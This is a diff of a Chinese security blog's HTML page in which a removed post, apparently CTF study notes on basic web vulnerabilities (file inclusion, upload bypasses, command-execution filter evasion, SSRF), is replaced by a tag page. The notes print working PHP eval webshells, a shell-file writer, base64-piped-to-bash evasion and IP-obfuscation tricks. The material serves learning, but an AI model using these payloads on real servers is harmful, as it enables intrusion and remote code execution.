@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>Web基础漏洞 | Wking&#39;s Blog</title>
+  <title>标签: Web知识点 | Wking&#39;s Blog</title>
 
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -566,959 +566,118 @@
     <div id="safearea">
       <main class="main" id="pjax-container" style="margin-top: 0;">
         
- <!-- prismjs 代码高亮 -->
- 
-    
-    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
-    
-        <link href="/js/prism/prism-tomorrow.min.css" rel="stylesheet">
-    
 
-    <style>
-        pre[class*="language-"] {
-            overflow-y: hidden;
-        }
-        .line-numbers .line-numbers-rows {
-            border: none;
-        }
-    </style>
-  
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
+<div class="bg-light-floor-tagDetail" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -3;"></div>
 
-
-<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
-
-<!-- 文章详情页顶部图片和标题 -->
-
-
-
-
-<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/8.jpg')">
-  <div class="post-detail-header-mask"></div>
-  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
-  
-  <div class="post-detail-header_info-box">
-    <div class="title-box">
-      <span class="title">
-        Web基础漏洞
-      </span>
-    </div>
-    
-    
-      
-        <span class="post-detail-header_date">
-          <i class="fas fa-calendar"></i> 发表于：2021-09-28 |
-        </span>
-      
-
-      
-        <span class="post-detail-header_categories">
-          <i class="iconfont iconbookmark1"></i> 分类：
-          
-            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-detail-header_category">
-              Web安全
-            </a>
-          
-        </span>
-      
-
-      
-        <div class="post-detail-header_wordcount">
-          <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 2.3k |
-          </span>
-  
-          <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 9分钟 |
-          </span>
-  
-          
-            <span class="reading">
-              <i class="fas fa-eye"></i> 阅读量：<span id="busuanzi_value_page_pv"></span>
-            </span>
-          
-        </div>
-      
-    
+<div class="tag-header" style="background-image: url('/medias/tag2.jpg');">
+  <div class="tag-header-title">
+    tag
   </div>
+  <div class="tag-header-desc">
   
-  
-    <script src="/js/bubble/bubble.js"></script>
-  
-</div>
-
-
-
-<div class="row justify-position">
-  <div class="main-content">
-    <article class="post post-detail">
-      <div class="post-content">
-        <h2 id="一、文件包含漏洞"><a href="#一、文件包含漏洞" class="headerlink" title="一、文件包含漏洞"></a>一、文件包含漏洞</h2><ul>
-<li><p>一、常见函数漏洞点</p>
-<ul>
-<li><p>include()、include_once()、require()、require_once()</p>
-</li>
-<li><p>应用场景：</p>
-<ul>
-<li><p>具有相关文件包含函数</p>
-</li>
-<li><p>存在动态变量 <code>inlcude $file</code></p>
-</li>
-<li><p>攻击者能够控制该变量 例如：<code>$file=$_GET[&#39;file&#39;]</code></p>
-</li>
-<li><p>file page等参数</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>二、本地文件和远程文件包含漏洞    （<a target="_blank" rel="noopener" href="https://www.cnblogs.com/appear001/p/11149996.html">相关链接</a>）</p>
-<ul>
-<li><p>本地文件</p>
-<ul>
-<li><p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞</p>
-</li>
-<li><p>常见敏感信息路径<img src="https://api2.mubu.com/v3/document_image/5393a52f-b373-4e3e-8ab6-f7ffe4d1ed64-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/5393a52f-b373-4e3e-8ab6-f7ffe4d1ed64-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
-</li>
-</ul>
-</li>
-<li><p>远程文件</p>
-<ul>
-<li>服务器的php.ini的配置选项<code>allow_url_fopen</code>和<code>allow_url_include</code>为On，则include/require函数式可加载远程文件</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>三、文件包含技巧之php伪协议包含</p>
-<ul>
-<li><p>类型</p>
-<ul>
-<li><p>file:// 访问本地文件系统</p>
-</li>
-<li><p>http:// 访问 HTTPs 网址</p>
-</li>
-<li><p>ftp:// 访问 ftp URL</p>
-</li>
-<li><p>php:// 访问输入输出流</p>
-</li>
-<li><p>phar:// php归档</p>
-</li>
-<li><p>zlib:// 压缩流</p>
-</li>
-<li><p>data:// 数据</p>
-</li>
-<li><p>ssh2:// security shell2</p>
-</li>
-<li><p>expect:// 处理交互式的流</p>
-</li>
-<li><p>glob:// 查找匹配的文件路径</p>
-</li>
-</ul>
-</li>
-<li><p>常用</p>
-<ul>
-<li><p><font color='red'>php://input</font></p>
-<p>它是个可以访问请求的原始数据的只读流，即获取post传过去的数据</p>
-<ul>
-<li><p>利用条件：allow_url_include = on , fopen不做要求</p>
-<ul>
-<li>利用方式：<code>include.php?file=php://input</code>,之后再传POST数据</li>
-</ul>
-</li>
-<li><p>POST：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 代码 <span class="token delimiter important">?></span></span>
-
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>  打印当前目录所有文件
-
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST["cmd"]); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  写入一句话木马文件
-
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../../../flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> 读取并显示文件
-
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'find / -name flag*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> 调用系统命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p><font color='red'>data:URI schema</font> （可以绕过php字符）</p>
-<ul>
-<li>利用条件：php&gt;=5.2,allow_url_include/fopen=on</li>
-<li>利用方式:<code>file=data:text/plain, php代码</code></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><font color='red'>php://filter</font></p>
-<p>一般用它来读取源码，不过要先经过base64加密，得到结果后再解密</p>
-<ul>
-<li>利用方式:<code>=php://filter/read=convert.base64-encode/resource=文件名</code></li>
-<li>常用来查看不被php解析显示的信息</li>
-</ul>
-</li>
-<li><p><font color='red'>phar://</font></p>
-<p>解析压缩包内的文件</p>
-<ul>
-<li><p>利用条件：php&gt;=5.3.0</p>
-</li>
-<li><p>phar://shell.zip/shell.txt</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>四、通过session文件包含getshell</p>
-<ul>
-<li><p>session简介</p>
-<ul>
-<li><p>cookie存在客户端，保存账号密码，session存在服务端，跟踪会话</p>
-</li>
-<li><p>一般对于登录点存在注册用户的，可以起一个为payload的名字，payload就会保存在session中</p>
-</li>
-</ul>
-</li>
-<li><p>利用条件：</p>
-<ul>
-<li><p>1、文件路径已知  可以通过phpinfo页面获取,session_save_path，或者猜测/var/lib/php/sess_PHPSESSID 或 /tmp/sess_PHPSESSID</p>
-</li>
-<li><p>2、其中部分内容可控</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="二、文件上传漏洞-amp-基本绕过"><a href="#二、文件上传漏洞-amp-基本绕过" class="headerlink" title="二、文件上传漏洞&amp;基本绕过"></a>二、文件上传漏洞&amp;基本绕过</h2><p><strong>一句话木马的两种形式，当&lt;?php被过滤时，可以用第二种</strong></p>
-<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;
-&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&quot;cmd&quot;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<ul>
-<li><p>一、文件上传漏洞绕过方式</p>
-<ul>
-<li><font color='red'>1、客户端验证</font><br>js脚本检验上传文件的后缀名，白名单/黑名单形式，只在前端验证</li>
-<li><font color='red'>2、服务端mime类型绕过</font></li>
-<li>服务端通过<code>Content-Type</code>的值来判断文件类型</li>
-<li>抓包后修改为 ，例如： image/jpeg  image/png等</li>
-<li><font color='red'>3、00截断绕过</font><ul>
-<li>条件：php版本在5.3之前 &amp;&amp; php参数设置里magic_quetos_gpc是关闭的</li>
-<li><code>%00</code> 将会截断后面的内容，代表字符串到此结束（注意get和filename都要修改）</li>
-</ul>
-</li>
-<li><font color='red'>4、文件头检验</font><ul>
-<li>（1） .JPEG;.JPE;.JPG，”JPGGraphic File”</li>
-<li>（2） .gif，”GIF 89A” </li>
-<li>（3） .zip，”Zip Compressed”</li>
-<li>（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>二、黑名单检测绕过</p>
-<ul>
-<li><p><font color='red'>1、黑名单过滤不全</font></p>
-<ul>
-<li>修改后缀名例如：<ul>
-<li>php3 php4 php5 phtml</li>
-<li>jsp jspx jspf</li>
-<li>asp asa cer aspx</li>
-</ul>
-</li>
-<li>大小写过滤不全：PHP</li>
-</ul>
-</li>
-<li><p><font color='red'>2、上传.htaccess文件绕过</font></p>
-<p>该文件时Apache服务器中的一个配置文件，负责相关目录下的网页配置</p>
-<ul>
-<li><p>新建一个.htaccess文件内容为：SetHandler application/x-httpd-php</p>
-</li>
-<li><p>再上传jpg文件，并打开即可解析</p>
-</li>
-</ul>
-</li>
-<li><p><font color='red'>3、空格和. 绕过</font></p>
-<ul>
-<li><p>在文件后面加上 空格或者点号</p>
-</li>
-<li><p>在文件后面加上 <code>. .</code>（点 空格 点）</p>
-</li>
-</ul>
-</li>
-<li><p><font color='red'>4、::$DATA绕过</font>     在文件后面加上::$DATA<br>基于Windows的NTFS文件流特性</p>
-</li>
-<li><p><font color='red'>5、双写绕过</font>——后缀名改为<code>pphphp</code></p>
-</li>
-</ul>
-</li>
-<li><p>三、图片木马利用</p>
-<ul>
-<li><p>使用条件</p>
-<ul>
-<li><p>1、需要结合文件包含漏洞</p>
-<ul>
-<li>目标网站存在该php漏洞，例如include.php，即可用/include.php?file=图片地址来实现webshell<img src="https://api2.mubu.com/v3/document_image/2ceabea5-b6a4-46b6-b791-c39396a7cde8-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/2ceabea5-b6a4-46b6-b791-c39396a7cde8-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></li>
-</ul>
-</li>
-<li><p>2、配合解析漏洞利用</p>
-</li>
-</ul>
-</li>
-<li><p>制作图片木马 命令行方式：copy 1.jpg/b+shell.php/a muma.jpg</p>
-</li>
-<li><p>图片二次渲染绕过</p>
-<ul>
-<li><p>JPG二次渲染绕过</p>
-<ul>
-<li><p>先将图片上传后再下载下来保存在本地例如123.jpg</p>
-</li>
-<li><p>把该123.jpg和jpg_payload.php放入带有php环境的文件夹中</p>
-</li>
-<li><p>cmd执行：php jpg_payload.php 123.jpg 生成新的木马图片</p>
-</li>
-<li><p>上传后利用文件包含漏洞实现webshell</p>
-</li>
-</ul>
-</li>
-<li><p>GIF二次渲染绕过</p>
-<ul>
-<li><p>上传后再下载到本地</p>
-</li>
-<li><p>用010Editor进行前后对比，找出没有二次渲染的部分</p>
-</li>
-<li><p>在没有渲染的部分加入代码，并再次上传</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>四、几种解析漏洞</p>
-<ul>
-<li><p>IIS5.X/6.0解析漏洞</p>
-<ul>
-<li><p>目录解析：/xx.asp/xx.jpg</p>
-<ul>
-<li>在网站下建立文件夹名称为.asp .asa的文件夹，目录内的任何文件都会被当作asp文件来解析并执行</li>
-</ul>
-</li>
-<li><p>文件解析：shell.asp;.jpg</p>
-<ul>
-<li>在IIS6.0下分号后面的不被解析，IIS6.0默认的可执行文件除了asp还包括：shell.asa/.cer/.cdx(黑检绕过)</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>IIS 7.0/7.5/ Ngnix&lt;8.03畸形解析漏洞</p>
-<ul>
-<li>在默认Fast_CGI开启下，上传一个名为shell.jpg的文件，内容为：</li>
-<li><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&#39;);?&gt;</code></li>
-<li>然后访问shell.jpg/.php，就会生成shell.php文件</li>
-</ul>
-</li>
-<li><p>Ngnix空字节代码执行漏洞</p>
-<ul>
-<li><p>版本：0.5、0.6、0.7&lt;=0.7.65 、0.8&lt;=0.8.37</p>
-</li>
-<li><p>在图片中嵌入php代码后访问：<code>xxx.jpg%00.php</code>来执行代码</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="三、RCE"><a href="#三、RCE" class="headerlink" title="三、RCE"></a>三、RCE</h2><ul>
-<li><p>常见操作命令</p>
-<ul>
-<li><p>常见命令执行函数</p>
-<ul>
-<li>system()</li>
-<li>passthru()</li>
-<li>exec()</li>
-<li>shell_exec()</li>
-<li>`反引号</li>
-<li>ob_start()</li>
-</ul>
-</li>
-<li><p>1.查看文件</p>
-<ul>
-<li><p><strong><font color='red'>linux查看文件命令</font></strong><img src="https://api2.mubu.com/v3/document_image/9d92c7b7-692a-4245-bb71-e28aae82ea48-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/9d92c7b7-692a-4245-bb71-e28aae82ea48-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
-</li>
-<li><p><font color='red'>windows：type flag.txt</font></p>
-</li>
-</ul>
-</li>
-<li><p>2.查找文件</p>
-<ul>
-<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xxmonstor/article/details/80507769">linux查找文件</a></p>
-</li>
-<li><p>find命令<img src="https://api2.mubu.com/v3/document_image/894f7bfb-df81-4091-bd7b-ef0076719340-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/894f7bfb-df81-4091-bd7b-ef0076719340-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"></p>
-</li>
-</ul>
-</li>
-<li><p>3.写入文件</p>
-<ul>
-<li>&gt;是覆写，&gt;&gt;是追加</li>
-</ul>
-</li>
-<li><p><code>echo &quot;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&quot;&gt;shell.php</code></p>
-</li>
-</ul>
-</li>
-<li><p>绕过技巧</p>
-<ul>
-<li><p><font color='red'>1.管道符</font></p>
-<ul>
-<li><p>linux<img src="https://api2.mubu.com/v3/document_image/b2056527-0ac9-41ea-a4c7-5686aa631e44-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/b2056527-0ac9-41ea-a4c7-5686aa631e44-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
-</li>
-<li><p>windows<img src="https://api2.mubu.com/v3/document_image/4cb6c028-a1a3-4564-b692-4d2c65ddcc7a-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/4cb6c028-a1a3-4564-b692-4d2c65ddcc7a-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
-</li>
-</ul>
-</li>
-<li><p><font color='red'>2.空格</font></p>
-<ul>
-<li><p>&lt;  重定向符 or &gt; &lt;&gt;</p>
-</li>
-<li><p>$IFS$9</p>
-</li>
-<li><p>%20</p>
-</li>
-<li><p>%09(需要php环境)</p>
-</li>
-</ul>
-</li>
-<li><p><font color='red'>3.前后缀</font></p>
-<ul>
-<li><p>%0a 换行符(php环境)</p>
-</li>
-<li><p>%00 截断</p>
-</li>
-<li><p>%20%23</p>
-</li>
-</ul>
-</li>
-<li><p><strong><font color='red'>4.黑名单绕过</font></strong></p>
-<ul>
-<li><p>1.拼接：a=c;b=at;c=fl;d=ag;$a$b $c$d</p>
-</li>
-<li><p>2.base64编码</p>
-<ul>
-<li><p>echo “Y2F0IGZsYWc=”|base64 -d (该编码为cat)</p>
-</li>
-<li><p>echo “Y2F0IGZsYWc=”|base64 -d|bash (在bash被过滤的情况下可尝试sh)</p>
-</li>
-</ul>
-</li>
-<li><p>3.单双引号：c””at fl’’ag</p>
-</li>
-<li><p>4.反斜线：c\at fl\ag</p>
-</li>
-<li><p>5.正则<img src="https://api2.mubu.com/v3/document_image/8f8ca449-d18f-497b-b5da-e05dba2b1b5e-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/8f8ca449-d18f-497b-b5da-e05dba2b1b5e-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
-</li>
-</ul>
-</li>
-<li><p>5.其他技巧</p>
-<ul>
-<li><p>1.内联执行—就是将``或$()内命令的输出作为输入执行</p>
-<ul>
-<li><p>cat$IFS$9<code>ls</code></p>
-</li>
-<li><p>cat$IFS$9$(ls)</p>
-</li>
-</ul>
-</li>
-<li><p>2.文件构造绕过</p>
-<p>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</p>
-<ul>
-<li><img src="https://api2.mubu.com/v3/document_image/e587b377-1752-445d-9285-bea15b567c22-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/e587b377-1752-445d-9285-bea15b567c22-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="四、SSRF-服务端请求构造"><a href="#四、SSRF-服务端请求构造" class="headerlink" title="四、SSRF(服务端请求构造)"></a>四、SSRF(服务端请求构造)</h2><ul>
-<li><p>SSRF（服务端请求伪造）</p>
-<p>一种构造请求，由服务端发起请求的安全漏洞</p>
-<ul>
-<li><p>漏洞原理</p>
-<ul>
-<li><p>服务端提供了从其他服务器获取数据的功能，但没有对内网目标地址做过滤和限制</p>
-</li>
-<li><p>主要方式：</p>
-</li>
-<li><p>1.对外网、服务器所在内网、本地进行端口扫描，获取Banner信息</p>
-</li>
-<li><p>2.测试运行在内网或本地的应用程序</p>
-</li>
-<li><p>3.利用file协议读取本地文件等</p>
-</li>
-</ul>
-</li>
-<li><p>漏洞代码分析</p>
-<ul>
-<li><img src="https://api2.mubu.com/v3/document_image/5206f57b-6a7a-434d-8e8c-dad04e71cfc1-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/5206f57b-6a7a-434d-8e8c-dad04e71cfc1-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></li>
-</ul>
-</li>
-<li><p>漏洞利用</p>
-<ul>
-<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11673190.html">伪协议利用</a></p>
-<ul>
-<li><p>file://  – 本地文件传输协议，主要用于访问本地计算机中的文件</p>
-</li>
-<li><p>gopher:// – 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前</p>
-</li>
-<li><p>dict://   – 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628</p>
-</li>
-<li><p>sftp://   – SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）</p>
-</li>
-<li><p>ldap://   – 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</p>
-</li>
-<li><p>tftp://   – 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机</p>
-</li>
-</ul>
-</li>
-<li><p>PHP函数</p>
-<ul>
-<li><p>file_get_contents()</p>
-</li>
-<li><p>fsockopen()</p>
-</li>
-<li><p>curl_exec()</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><font color='red'>gopher协议详解</font>—<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">链接</a></p>
-<ul>
-<li><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
-</li>
-<li><p>gopher协议格式：URL:<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></p>
-</li>
-<li><p>gopher的默认端口是70</p>
-</li>
-<li><p>如果发起post请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的<code>&amp;</code>也需要进行URL编码</p>
-</li>
-<li><p>发送HTTP请求<img src="https://api2.mubu.com/v3/document_image/0ce1c2f7-5c82-45ee-bd84-14f0b7b569bb-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/0ce1c2f7-5c82-45ee-bd84-14f0b7b569bb-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
-</li>
-<li><p>注意事项<img src="https://api2.mubu.com/v3/document_image/c39e8c8e-4ab9-4599-bf6b-de760df958cf-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/c39e8c8e-4ab9-4599-bf6b-de760df958cf-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
-</li>
-</ul>
-</li>
-<li><p>IP绕过方式—<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/73736127">链接</a></p>
-<ul>
-<li><p><code>locahost绕过</code>：攻击本地地址，过滤掉127.0.0.1的情况下，用locahost替代</p>
-</li>
-<li><p><code>利用@</code>：<a target="_blank" rel="noopener" href="http://example.com@127.0.0.1/">http://example.com@127.0.0.1</a> 实际访问的是后面ip</p>
-</li>
-<li><p><code>进制转换绕过</code>，例如：127.0.0.1可以转换为：</p>
-<ul>
-<li>十六进制 = 0x7F000001</li>
-<li>十进制 = 2130706433</li>
-<li>十进制转换 八进制转换 十六进制转换  不同进制组合转换</li>
-</ul>
-</li>
-<li><p><code>利用句号</code>：127。0。0。1  &gt;&gt;&gt;  127.0.0.1</p>
-</li>
-<li><p><code>利用302跳转</code></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://xip.io/">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="五、CSRF"><a href="#五、CSRF" class="headerlink" title="五、CSRF"></a>五、CSRF</h2>
-      </div>
-      <div class="post-tags-categories">
-        
-        <div class="tags">
-          
-            <a href="/tags/Web%E7%9F%A5%E8%AF%86%E7%82%B9/" class="">
-              Web知识点
-            </a>
-          
-        </div>
-        
-      </div>
-      
-        <div class="copyright">
-  <ul class="post-copyright">
-    <li class="post-copyright-author">
-    <strong>作者:  </strong>Wking</a>
-    </li>
-    <li class="post-copyright-link">
-    <strong>文章链接:  </strong>
-    <a href="/2021/09/28/Web基础漏洞/" target="_blank" title="Web基础漏洞">https://Wkingxc.com/2021/09/28/Web基础漏洞/</a>
-    </li>
-    <li class="post-copyright-license">
-      <strong>版权声明:   </strong>
-      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
-      许可协议。转载请注明出处!
-    </li>
-  </ul>
-<div>
-      
-    </article>
-    <!-- 上一篇文章和下一篇文章 -->
-    
-      <!-- 文章详情页的上一页和下一页 -->
-<div class="post-nav">
-
-
-
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/8.jpg" class="lazyload placeholder" data-srcset="/medias/8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
-    </div>
-    <a href="/2021/09/29/XCTF-fakegame/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">XCTF_fakebook</div>
-      </div>
-      
-      <!-- <div class="content">
-        一、fakebook
-发现是个登录注册页面，没有明确的目标，先用dirsearch扫描下目录
-
-查看flag.php,发
-      </div> -->
-    </a>
-  </div>
-
-
-
-  
-  <div class="post-nav-next post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/14.jpg" class="lazyload placeholder" data-srcset="/medias/14.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
-    </div>
-    <a href="/2021/09/27/%E7%94%B5%E7%A3%81%E5%AD%A6/" class="post-nav-link">
-      <div class="title">
-        下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">大物电磁学</div>
-      </div>
-      <!-- <div class="content">
-        常用公式：
-
-
-
-      </div> -->
-    </a>
-  </div>
-
-</div>
-
-    
-    
-
-    <!-- 打赏 -->
-    
-
-    <!-- 分享 -->
-    
-      <!-- https://github.com/overtrue/share.js -->
-<!-- 文章详情页的分享 -->
-<div class="social-share" data-sites="qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-
-<script src="/js/shareJs/social-share.min.js"></script>
-</script>
-
-<style>
-  .social-share {
-    margin: 20px 0;
+    <span class="title" id="tag-header-desc"></span>
+    <script>
+  function typedFn() {
+    const el = '#tag-header-desc';
+    const type = 'tagDetail';
+    let desc = '愿你如风，被人温柔以待'
+    var typed = new Typed(el, {
+      strings: [desc],
+      startDelay: 100,
+      typeSpeed: 60,
+      loop: true,
+      backSpeed: 50,
+      showCursor: true
+    });
   }
-</style>
-
-
-    
-    
-    <!-- 评论 -->
-    <!-- 评论 -->
-
-  <div id="myComment">
-    
-      
-<section id="comments" style="padding: 1em; margin: 15px auto;"
-	class="animated bounceInUp">
-	<div id="vcomment" class="comment"></div>
-</section>
-<style>
-	#comments {
-		background: rgba(255,255,255,0.9);
-	}
-	#veditor {
-		background-image: url('https://img.zcool.cn/community/01a253594c71cfa8012193a329a77f.gif');
-		background-size: contain;
-		background-repeat: no-repeat;
-		background-position: right;
-		background-color: rgba(255, 255, 255, 0);
-		resize: vertical;
-	}
-	#veditor:focus{
-		background-position-y: 200px;
-		transition: all 0.2s ease-in-out 0s;
-	}
-	#vcomment .vcards .vcard .vh .vhead .vtag.vvisitor {
-		background-color: #42b983;
-	}
-	.v[data-class=v] .vbtn:active, .v[data-class=v] .vbtn:hover {
-		color: #42b983;
-		border-color: #42b983;
-	}
-	#vcomment .vcards .vcard .vhead .vsys i {
-		display: none;
-	}
-	/* 底部valine链接 */
-	#vcomment .vpower {
-		display: none;
-	}
-	
-	/* 底下注释是修改 名称和邮箱和网址输入框的样式 */
-	/* #vcomment .vheader {
-		display: flex;
-		justify-content: space-around;
-	}
-	
-	#vcomment .vheader .vnick {
-		width: 31%;
-		border: 2px solid #dedede;
-		padding-left: 10px;
-		padding-right: 10px;
-		border-radius: 5px
-	}
-
-	#vcomment .vheader .vmail {
-		width: 31%;
-		border: 2px solid #dedede;
-		padding-left: 10px;
-		padding-right: 10px;
-		border-radius: 5px
-	}
-
-	#vcomment .vheader .vlink {
-		width: 31%;
-		border: 2px solid #dedede;
-		padding-left: 10px;
-		padding-right: 10px;
-		border-radius: 5px
-	} */
-
-	img.vimg {
-		transition: all 1s;
-		/* 头像旋转时间为 1s */
-	}
-
-	img.vimg:hover {
-		transform: rotate(360deg);
-		-webkit-transform: rotate(360deg);
-		-moz-transform: rotate(360deg);
-		-o-transform: rotate(360deg);
-		-ms-transform: rotate(360deg);
-	}
-
-	#vcomment .vcards .vcard {
-		padding: 15px 20px 0 20px;
-		border-radius: 10px;
-		margin-bottom: 15px;
-		box-shadow: 0 0 4px 1px rgba(0, 0, 0, .12);
-		transition: all .3s
-	}
-
-	#vcomment .vcards .vcard:hover {
-		box-shadow: 0 0 8px 3px rgba(0, 0, 0, .12)
-	}
-
-	#vcomment .vcards .vcard .vh .vcard {
-		border: none;
-		box-shadow: none;
-	}
